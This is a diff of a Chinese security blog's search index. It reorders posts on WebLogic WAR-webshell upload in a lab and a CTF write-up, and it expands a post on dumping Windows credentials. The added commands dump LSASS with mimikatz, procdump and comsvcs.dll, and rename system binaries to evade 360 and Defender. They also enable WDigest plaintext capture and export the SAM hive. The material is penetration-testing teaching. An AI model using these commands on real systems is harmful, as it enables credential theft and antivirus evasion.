@@ -598,6 +598,17 @@
       </tags>
   </entry>
   <entry>
+    <title>Oracle注入</title>
+    <url>/2021/01/10/Oracle%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>常见数据库注入</category>
+      </categories>
+      <tags>
+        <tag>Oracel注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SQL注入</title>
     <url>/2021/01/10/SQL%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>用户拥有可控参数，并且用户传入的参数被当作代码执行。</p>
@@ -783,59 +794,6 @@
       </tags>
   </entry>
   <entry>
-    <title>middleware</title>
-    <url>/2022/03/20/middleware-java/</url>
-    <content><![CDATA[<h1 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h1><p>默认端口：<code>7001</code></p>
-<p>部分历史漏洞</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 弱口令&#x2F;任意文件读取+后台war包&#x2F;任意文件上传getshell</span><br><span class="line">2. CVE-2017-20271</span><br><span class="line">3. CVE-2018-2628</span><br><span class="line">4. CVE-2019-2725</span><br><span class="line">5. CVE-2020-2555</span><br><span class="line">6. CVE-2021-2394</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>WebLogic是<a href="https://baike.baidu.com/item/%E7%BE%8E%E5%9B%BDOracle%E5%85%AC%E5%8F%B8/9952086">美国Oracle公司</a>出品的一个application server，确切的说是一个基于<a href="https://baike.baidu.com/item/JAVAEE/3066623">JAVAEE</a>架构的<a href="https://baike.baidu.com/item/%E4%B8%AD%E9%97%B4%E4%BB%B6/452240">中间件</a>，WebLogic是用于<a href="https://baike.baidu.com/item/%E5%BC%80%E5%8F%91/9400971">开发</a>、集成、部署和管理大型分布式Web应用、<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/2196523">网络应用</a>和<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BA%94%E7%94%A8/10563731">数据库应用</a>的Java<a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8">应用服务器</a>。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
-<p>WebLogic Server具有开发和部署关键任务电子商务Web应用系统 所需的多种特色和优势。</p>
-<span id="more"></span>
-
-<p>weblogic是java EE的应用服务器（application server），包括ejb ,jsp,servlet,jms等等，全能型的。是商业软件里排名第一的容器（JSP、servlet、EJB等），并提供其他如JAVA编辑等工具，是一个综合的开发及运行环境。(收费)</p>
-<!--more-->
-
-<p><img src="/2022/03/20/middleware-java/image-20220323214802592.png" alt="image-20220323214802592"></p>
-<p>以下环境为vulhub靶场环境</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub.git</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="弱口令-上传war包"><a href="#弱口令-上传war包" class="headerlink" title="弱口令+上传war包"></a>弱口令+上传war包</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>weblogic搭建完后没有修改后台登陆密码</p>
-<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>启动环境</p>
-<p><img src="/2022/03/20/middleware-java/image-20220324002901248.png" alt="image-20220324002901248"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.119.165:7001&#x2F;console       访问后台</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/03/20/middleware-java/image-20220324010752442.png" alt="image-20220324010752442"></p>
-<p>weblogic/Oracle@123登陆后台（bp爆破，密码错五次就会禁止认证）</p>
-<p>下面要准备war包上传</p>
-<p><img src="/2022/03/20/middleware-java/image-20220324011153236.png" alt="image-20220324011153236"></p>
-<p>点上传文件</p>
-<p><img src="/2022/03/20/middleware-java/image-20220324011308204.png" alt="image-20220324011308204"></p>
-<p>将jsp马（哥斯拉生成jsp）打包成war包</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jar -cvf shell.war 1.jsp</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/03/20/middleware-java/image-20220324011818173.png" alt="image-20220324011818173"></p>
-<p>然后一直下一步，完成</p>
-<p><img src="/2022/03/20/middleware-java/image-20220324011923927.png" alt="image-20220324011923927"></p>
-<p>成功上传</p>
-<p><img src="/2022/03/20/middleware-java/image-20220324012109060.png" alt="image-20220324012109060"></p>
-<p>访问：<a href="http://192.168.119.165:7001/shell/1.jsp">http://192.168.119.165:7001/shell/1.jsp</a> ，shell连接</p>
-<p><img src="/2022/03/20/middleware-java/image-20220324014607221.png" alt="image-20220324014607221"></p>
-<p><img src="/2022/03/20/middleware-java/image-20220324014649096.png" alt="image-20220324014649096"></p>
-<p>参考：<a href="https://xz.aliyun.com/t/9932#toc-4">weblogic漏洞大杂烩 - 先知社区 (aliyun.com)</a></p>
-<p>工具：(<a href="https://github.com/0xn0ne/weblogicScanner">https://github.com/0xn0ne/weblogicScanner</a>)</p>
-<h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><h1 id="jboss"><a href="#jboss" class="headerlink" title="jboss"></a>jboss</h1><p>jboss/jboss +war上传</p>
-<h1 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h1><h1 id="ngnix"><a href="#ngnix" class="headerlink" title="ngnix"></a>ngnix</h1><h1 id="iis"><a href="#iis" class="headerlink" title="iis"></a>iis</h1>]]></content>
-      <categories>
-        <category>中间件</category>
-      </categories>
-      <tags>
-        <tag>中间件</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>log4j2远程代码执行漏洞</title>
     <url>/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h1 id="Apache-Log4j-2远程代码执行漏洞（-CVE-2021-44228）"><a href="#Apache-Log4j-2远程代码执行漏洞（-CVE-2021-44228）" class="headerlink" title="Apache Log4j 2远程代码执行漏洞（ CVE-2021-44228）"></a>Apache Log4j 2远程代码执行漏洞（ CVE-2021-44228）</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache log4j是Apache的一个开源项目，Apache log4j 2是一个就<code>Java的日志记录工具</code>。该工具重写了log4j框架，并且引入了大量丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI组建等，通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。</p>
@@ -915,6 +873,89 @@
       </tags>
   </entry>
   <entry>
+    <title>middleware</title>
+    <url>/2022/03/20/middleware-java/</url>
+    <content><![CDATA[<h1 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h1><p>默认端口：<code>7001</code></p>
+<p>部分历史漏洞</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 弱口令&#x2F;任意文件读取+后台war包&#x2F;任意文件上传getshell</span><br><span class="line">2. CVE-2017-20271</span><br><span class="line">3. CVE-2018-2628</span><br><span class="line">4. CVE-2019-2725</span><br><span class="line">5. CVE-2020-2555</span><br><span class="line">6. CVE-2021-2394</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>WebLogic是<a href="https://baike.baidu.com/item/%E7%BE%8E%E5%9B%BDOracle%E5%85%AC%E5%8F%B8/9952086">美国Oracle公司</a>出品的一个application server，确切的说是一个基于<a href="https://baike.baidu.com/item/JAVAEE/3066623">JAVAEE</a>架构的<a href="https://baike.baidu.com/item/%E4%B8%AD%E9%97%B4%E4%BB%B6/452240">中间件</a>，WebLogic是用于<a href="https://baike.baidu.com/item/%E5%BC%80%E5%8F%91/9400971">开发</a>、集成、部署和管理大型分布式Web应用、<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/2196523">网络应用</a>和<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BA%94%E7%94%A8/10563731">数据库应用</a>的Java<a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8">应用服务器</a>。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
+<p>WebLogic Server具有开发和部署关键任务电子商务Web应用系统 所需的多种特色和优势。</p>
+<span id="more"></span>
+
+<p>weblogic是java EE的应用服务器（application server），包括ejb ,jsp,servlet,jms等等，全能型的。是商业软件里排名第一的容器（JSP、servlet、EJB等），并提供其他如JAVA编辑等工具，是一个综合的开发及运行环境。(收费)</p>
+<!--more-->
+
+<p><img src="/2022/03/20/middleware-java/image-20220323214802592.png" alt="image-20220323214802592"></p>
+<p>以下环境为vulhub靶场环境</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub.git</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="弱口令-上传war包"><a href="#弱口令-上传war包" class="headerlink" title="弱口令+上传war包"></a>弱口令+上传war包</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>weblogic搭建完后没有修改后台登陆密码</p>
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>启动环境</p>
+<p><img src="/2022/03/20/middleware-java/image-20220324002901248.png" alt="image-20220324002901248"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.119.165:7001&#x2F;console       访问后台</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/20/middleware-java/image-20220324010752442.png" alt="image-20220324010752442"></p>
+<p>weblogic/Oracle@123登陆后台（bp爆破，密码错五次就会禁止认证）</p>
+<p>下面要准备war包上传</p>
+<p><img src="/2022/03/20/middleware-java/image-20220324011153236.png" alt="image-20220324011153236"></p>
+<p>点上传文件</p>
+<p><img src="/2022/03/20/middleware-java/image-20220324011308204.png" alt="image-20220324011308204"></p>
+<p>将jsp马（哥斯拉生成jsp）打包成war包</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jar -cvf shell.war 1.jsp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/20/middleware-java/image-20220324011818173.png" alt="image-20220324011818173"></p>
+<p>然后一直下一步，完成</p>
+<p><img src="/2022/03/20/middleware-java/image-20220324011923927.png" alt="image-20220324011923927"></p>
+<p>成功上传</p>
+<p><img src="/2022/03/20/middleware-java/image-20220324012109060.png" alt="image-20220324012109060"></p>
+<p>访问：<a href="http://192.168.119.165:7001/shell/1.jsp">http://192.168.119.165:7001/shell/1.jsp</a> ，shell连接</p>
+<p><img src="/2022/03/20/middleware-java/image-20220324014607221.png" alt="image-20220324014607221"></p>
+<p><img src="/2022/03/20/middleware-java/image-20220324014649096.png" alt="image-20220324014649096"></p>
+<p>参考：<a href="https://xz.aliyun.com/t/9932#toc-4">weblogic漏洞大杂烩 - 先知社区 (aliyun.com)</a></p>
+<p>工具：(<a href="https://github.com/0xn0ne/weblogicScanner">https://github.com/0xn0ne/weblogicScanner</a>)</p>
+<h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><h1 id="jboss"><a href="#jboss" class="headerlink" title="jboss"></a>jboss</h1><p>jboss/jboss +war上传</p>
+<h1 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h1><h1 id="ngnix"><a href="#ngnix" class="headerlink" title="ngnix"></a>ngnix</h1><h1 id="iis"><a href="#iis" class="headerlink" title="iis"></a>iis</h1>]]></content>
+      <categories>
+        <category>中间件</category>
+      </categories>
+      <tags>
+        <tag>中间件</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>mrctf2021</title>
+    <url>/2021/04/18/mrctf2021/</url>
+    <content><![CDATA[<p>自己太菜了，开始复盘。</p>
+<p><img src="/2021/04/18/mrctf2021/0.png" alt="0"></p>
+<h2 id="MISC-Real-Checkin"><a href="#MISC-Real-Checkin" class="headerlink" title="MISC-Real Checkin"></a>MISC-Real Checkin</h2><p>记录下这个零宽隐写，网上找的工具没有解出来</p>
+<span id="more"></span>
+
+<p>叮咚！你的好大儿zbr向你发送了签到码，请注意查收：‍‎‏‍‎‍‍‎‌‌‌‍‍‎‍‎‏‎‌‎‌‌‍‎‌‌‎‌‌‍‏‎‍‎‎‌‌‍‌‏‎‎‌‍‎‌‍‎‍‎‎‍‎‎‍‏‎‎‎‍‏‌H0Xh2vcqESOonvfZJLaVupnpD3guAeq8VeO1O932HXhvlBLY2F/DRh5BmEGeHyutT3uZVTYGA503bF6tVem31Eq1MEGYpNuMkfHQ8Pbpfski7hqkDZ4n48H5OdSmsiVC   一看是加密相关的内容，base64不对，不知道什么加密，后来出题方说是零宽隐写。</p>
+<p>空格部分就是隐写的零宽字符，我们放虚拟机看下</p>
+<p><img src="/2021/04/18/mrctf2021/1.png" alt="1"></p>
+<p>群里师傅说直接说把隐写内容复制到<code>pyhon</code>里面直接用<code>zwsp_steg</code>库解密。 这里解密的内容一定要是空格那部分，而不是我想的&lt;200d&gt;&lt;200e&gt;…这部分。</p>
+<p><img src="/2021/04/18/mrctf2021/1.1.png" alt="1.1"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ECB AES QQID 0RPADDINGd</span><br></pre></td></tr></table></figure>
+
+<p>一看就是AES加密，EBC为加密模式，密钥就是qq号呗</p>
+<p><a href="https://the-x.cn/cryptography/Aes.aspx">https://the-x.cn/cryptography/Aes.aspx</a></p>
+<p><img src="/2021/04/18/mrctf2021/1.2.png" alt="1.2"></p>
+<p>太菜了呜呜呜。</p>
+<p><a href="https://tl2cents.github.io/2021/04/11/2021-MRCTF-WriteUp/">https://tl2cents.github.io/2021/04/11/2021-MRCTF-WriteUp/</a> 网上也有其他师傅解法，大家参考。</p>
+<hr>
+<p>web没有写文章，waf，check_in还是好玩的。这里贴wp：<a href="https://www.anquanke.com/post/id/237917">https://www.anquanke.com/post/id/237917</a>  </p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>MRCTF2021</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>msf-端口转发-反弹shell</title>
     <url>/2021/06/03/msf-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-%E5%8F%8D%E5%BC%B9shell/</url>
     <content><![CDATA[<p>这里借助的是免费的端口转发工具，来进行演示。</p>
@@ -965,36 +1006,6 @@
       </categories>
       <tags>
         <tag>MSF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>mrctf2021</title>
-    <url>/2021/04/18/mrctf2021/</url>
-    <content><![CDATA[<p>自己太菜了，开始复盘。</p>
-<p><img src="/2021/04/18/mrctf2021/0.png" alt="0"></p>
-<h2 id="MISC-Real-Checkin"><a href="#MISC-Real-Checkin" class="headerlink" title="MISC-Real Checkin"></a>MISC-Real Checkin</h2><p>记录下这个零宽隐写，网上找的工具没有解出来</p>
-<span id="more"></span>
-
-<p>叮咚！你的好大儿zbr向你发送了签到码，请注意查收：‍‎‏‍‎‍‍‎‌‌‌‍‍‎‍‎‏‎‌‎‌‌‍‎‌‌‎‌‌‍‏‎‍‎‎‌‌‍‌‏‎‎‌‍‎‌‍‎‍‎‎‍‎‎‍‏‎‎‎‍‏‌H0Xh2vcqESOonvfZJLaVupnpD3guAeq8VeO1O932HXhvlBLY2F/DRh5BmEGeHyutT3uZVTYGA503bF6tVem31Eq1MEGYpNuMkfHQ8Pbpfski7hqkDZ4n48H5OdSmsiVC   一看是加密相关的内容，base64不对，不知道什么加密，后来出题方说是零宽隐写。</p>
-<p>空格部分就是隐写的零宽字符，我们放虚拟机看下</p>
-<p><img src="/2021/04/18/mrctf2021/1.png" alt="1"></p>
-<p>群里师傅说直接说把隐写内容复制到<code>pyhon</code>里面直接用<code>zwsp_steg</code>库解密。 这里解密的内容一定要是空格那部分，而不是我想的&lt;200d&gt;&lt;200e&gt;…这部分。</p>
-<p><img src="/2021/04/18/mrctf2021/1.1.png" alt="1.1"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ECB AES QQID 0RPADDINGd</span><br></pre></td></tr></table></figure>
-
-<p>一看就是AES加密，EBC为加密模式，密钥就是qq号呗</p>
-<p><a href="https://the-x.cn/cryptography/Aes.aspx">https://the-x.cn/cryptography/Aes.aspx</a></p>
-<p><img src="/2021/04/18/mrctf2021/1.2.png" alt="1.2"></p>
-<p>太菜了呜呜呜。</p>
-<p><a href="https://tl2cents.github.io/2021/04/11/2021-MRCTF-WriteUp/">https://tl2cents.github.io/2021/04/11/2021-MRCTF-WriteUp/</a> 网上也有其他师傅解法，大家参考。</p>
-<hr>
-<p>web没有写文章，waf，check_in还是好玩的。这里贴wp：<a href="https://www.anquanke.com/post/id/237917">https://www.anquanke.com/post/id/237917</a>  </p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>MRCTF2021</tag>
       </tags>
   </entry>
   <entry>
@@ -1172,17 +1183,6 @@
       </categories>
       <tags>
         <tag>sqlmap</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Oracle注入</title>
-    <url>/2021/01/10/Oracle%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>常见数据库注入</category>
-      </categories>
-      <tags>
-        <tag>Oracel注入</tag>
       </tags>
   </entry>
   <entry>
@@ -1555,7 +1555,8 @@
   <entry>
     <title>内网抓hash/密码</title>
     <url>/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/</url>
-    <content><![CDATA[<h1 id="1mimikatz"><a href="#1mimikatz" class="headerlink" title="1mimikatz"></a>1mimikatz</h1><p>只需要管理员权限</p>
+    <content><![CDATA[<p>在内网渗透中拿到普通域用户/域管 hash，就可以直接pth。</p>
+<h1 id="1-mimikatz"><a href="#1-mimikatz" class="headerlink" title="1. mimikatz"></a>1. mimikatz</h1><p>只需要<code>管理员权限</code></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.txt </span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220325161740275.png" alt="image-20220325161740275"></p>
@@ -1566,39 +1567,60 @@
 
 
 
-<h1 id="2各种dump-mimikatz"><a href="#2各种dump-mimikatz" class="headerlink" title="2各种dump+mimikatz"></a>2各种dump+mimikatz</h1><h3 id="procdump"><a href="#procdump" class="headerlink" title="procdump"></a>procdump</h3><p>(官方软件)</p>
+<h1 id="2-各种dump-mimikatz"><a href="#2-各种dump-mimikatz" class="headerlink" title="2. 各种dump+mimikatz"></a>2. 各种dump+mimikatz</h1><h3 id="procdump"><a href="#procdump" class="headerlink" title="procdump"></a>procdump</h3><p>(官方软件)</p>
 <p>有杀软的情况procdump不会被杀，但产生的lsass.dmp会可能被清除 （wdf下面会），我感觉应该在wdf白名单路径下进行转储</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp   #然后将lsass.dmp下载到本地</span><br><span class="line"></span><br><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">procdump64.exe -accepteula -ma [lsass.exe的PID] lsass.dmp</span><br><span class="line">(mimikatz.exe &quot;sekurlsa::minidump dump path &quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;)</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220325150155475.png" alt="image-20220325150155475"></p>
-<h3 id="rundll32-exe"><a href="#rundll32-exe" class="headerlink" title="rundll32.exe"></a>rundll32.exe</h3><p>(Windows自带)     原理是通过API MiniDumpWriteDump，利用comsvcs.dll导出 函数 minidump 进行dump内存</p>
-<p>条件：开启SeDebugPrivilege权限 （管理员cmd下改权限 一般情况是Disabled状态，powershell下默认开启）</p>
+<h3 id="rundll32-exe-这个就-够了"><a href="#rundll32-exe-这个就-够了" class="headerlink" title="rundll32.exe  这个就 够了"></a>rundll32.exe  这个就 够了</h3><p>(Windows自带C:\WINDOWS\System32\rundll32.exe)     原理是通过<code>API MiniDumpWriteDump</code>，利用<code>comsvcs.dll</code>导出 函数 minidump 进行dump内存</p>
+<p>条件：<code>开启SeDebugPrivilege权限</code> （管理员cmd下改权限 一般情况是Disabled状态，powershell下默认开启）</p>
 <p> powershell/cmd下运行comsvcs.dll 的MiniDump 来dump</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\lsass.dmp full</span><br></pre></td></tr></table></figure>
 
 <p>但要绕过AMSI</p>
 <p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220325172436533-16484821151331.png" alt="image-20220325172436533"></p>
-<p>重要问题：绕过杀软</p>
-<p>cmd下  执行火绒，360，wdf  都报毒，并且还可能没有权限</p>
-<p>powershell下  火绒不报，</p>
-<p><a href="https://mp.weixin.qq.com/s/IA42D6hjvk4Bld65Wahuag">免杀转储lsass进程技巧 (qq.com)</a></p>
-<h3 id="AvDump"><a href="#AvDump" class="headerlink" title="AvDump"></a>AvDump</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AvDump.exe --pid &lt;lsass pid&gt; --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file C:\Users\admin\Desktop\lsass.dmp --min_interval 0</span><br></pre></td></tr></table></figure>
+<p>重要问题：</p>
+<h5 id="如何绕过杀软"><a href="#如何绕过杀软" class="headerlink" title="如何绕过杀软"></a>如何绕过杀软</h5><p>cmd下  执行火绒，360，wdf  都报毒，并且还可能没有权限</p>
+<p>powershell下  火绒不报， 360报， wdf 的amsi直接拦截</p>
+<h5 id="绕360和wdf"><a href="#绕360和wdf" class="headerlink" title="绕360和wdf"></a>绕360和wdf</h5><p>参考下面文章，但是2022.3.30这种方法不能绕了，，<br>(<a href="https://mp.weixin.qq.com/s/IA42D6hjvk4Bld65Wahuag">https://mp.weixin.qq.com/s/IA42D6hjvk4Bld65Wahuag</a>)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy C:\windows\System32\comsvcs.dll bypass360.dll</span><br><span class="line">rundll32.exe bypass360.dll, MiniDump pid lsass.dmp full    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
 
-<h3 id="SqlDumper"><a href="#SqlDumper" class="headerlink" title="SqlDumper"></a>SqlDumper</h3><h1 id="3导出本地SAM-mimikatz"><a href="#3导出本地SAM-mimikatz" class="headerlink" title="3导出本地SAM+mimikatz"></a>3导出本地SAM+mimikatz</h1><p>导出本地sam数据库数据</p>
+<p>2022.3.30后来我又想到了，copy个新的rundll32.exe  命名为1.exe ，直接就绕过了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd  C:\WINDOWS\System32</span><br><span class="line"></span><br><span class="line">copy C:\windows\System32\comsvcs.dll bypass360.dll</span><br><span class="line">copy C:\WINDOWS\System32\rundll32.exe 1.exe</span><br><span class="line"></span><br><span class="line">1.exe bypass360.dll, MiniDump pid lsass.dmp full</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220330172101684.png" alt="image-20220330172101684"></p>
+<p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220330172955506.png" alt="image-20220330172955506"></p>
+<ul>
+<li>方法肯定很多，这个要分析杀软是怎么进行检测，然后进行对抗绕过。 呜呜呜真的不会其他的</li>
+</ul>
+<h3 id="Out-MiniDump"><a href="#Out-MiniDump" class="headerlink" title="Out-MiniDump"></a>Out-MiniDump</h3><p>Out-MiniDump.ps1 wdf直接杀，而且环境win10下Import-Module 不能执行，可能win server能用吧</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module Out-MiniDump  </span><br><span class="line"></span><br><span class="line">Get-Process lsass | Out-Minidump   </span><br></pre></td></tr></table></figure>
+
+<p>没有成功就补截图了</p>
+<h3 id="AvDump"><a href="#AvDump" class="headerlink" title="AvDump"></a>AvDump</h3><p>我没有搞成功。。。。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AvDump.exe --pid &lt;lsass pid&gt; --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file C:\Users\admin\Desktop\lsass.dmp --min_interval 0</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="SqlDumper"><a href="#SqlDumper" class="headerlink" title="SqlDumper"></a>SqlDumper</h3><p>在sqlserver安装路径为：\Program Files\Microsoft SQL Server\90\Shared\SQLDumper.exe</p>
+<p>单独安装需要MSVRC100.dll  （[<a href="https://www.microsoft.com/zh-cn/download/confirmation.aspx?id=26999)%EF%BC%89">https://www.microsoft.com/zh-cn/download/confirmation.aspx?id=26999)）</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Sqldumper.exe &lt;ProcessID&gt; 0 0x01100    完整转储</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220330155608001.png" alt="image-20220330155608001"></p>
+<h1 id="3-导出本地SAM-mimikatz"><a href="#3-导出本地SAM-mimikatz" class="headerlink" title="3. 导出本地SAM+mimikatz"></a>3. 导出本地SAM+mimikatz</h1><p>导出本地sam数据库数据，（这个只能获得所有<code>本地用户</code>hash）</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">reg save HKLM\SAM SAM </span><br></pre></td></tr></table></figure>
 
 <p>mimikatz读取即可</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::sam &#x2F;sam:SAM &#x2F;system:SYSTEM exit&quot;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220325171109114.png" alt="image-20220325171109114"></p>
-<h1 id="rdp明文凭据"><a href="#rdp明文凭据" class="headerlink" title="rdp明文凭据"></a>rdp明文凭据</h1><p>参考:<a href="https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/">https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/</a></p>
-<p>(<a href="https://loong716.top/posts/lsass/#2-%E7%AD%BE%E5%90%8D%E7%99%BD%E5%90%8D%E5%8D%95%E6%96%87%E4%BB%B6dum">https://loong716.top/posts/lsass/#2-签名白名单文件dum</a></p>
 <h1 id="tips"><a href="#tips" class="headerlink" title="tips:"></a>tips:</h1><ol>
 <li>winserver2012以后只能抓到用户hash，抓不到明文</li>
 </ol>
-<p>但可以通过修改注册表<strong>开启Wdigest Auth</strong>，然后cmd执行强制锁频（rundll32 user32.dll,LockWorkStation），等待管理员重新登陆</p>
+<p>但可以通过修改注册表**<code>开启Wdigest Auth</code>**，</p>
+<p>然后cmd执行<code>强制锁频</code>（rundll32 user32.dll,LockWorkStation），等待管理员重新登陆在抓</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br></pre></td></tr></table></figure>
 
 <ol start="2">
@@ -1912,7 +1934,12 @@
 <h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><ul>
 <li>条件竞争</li>
 </ul>
-<h1 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h1><h1 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h1><hr>
+<h1 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h1><h1 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h1><h3 id="常用协议："><a href="#常用协议：" class="headerlink" title="常用协议："></a>常用协议：</h3><p>file，dict，gopher，dns</p>
+<h3 id="ssrf-redis"><a href="#ssrf-redis" class="headerlink" title="ssrf+redis"></a>ssrf+redis</h3><ol>
+<li>主从复制</li>
+<li>计划任务</li>
+</ol>
+<hr>
 <h1 id="网站源码备份"><a href="#网站源码备份" class="headerlink" title="网站源码备份"></a>网站源码备份</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">tar -zcvf ~&#x2F;html.tar.gz *</span><br></pre></td></tr></table></figure>
 
 
@@ -2168,118 +2195,6 @@
       </tags>
   </entry>
   <entry>
-    <title>简单的靶场渗透</title>
-    <url>/2022/01/03/%E7%AE%80%E5%8D%95%E7%9A%84%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/</url>
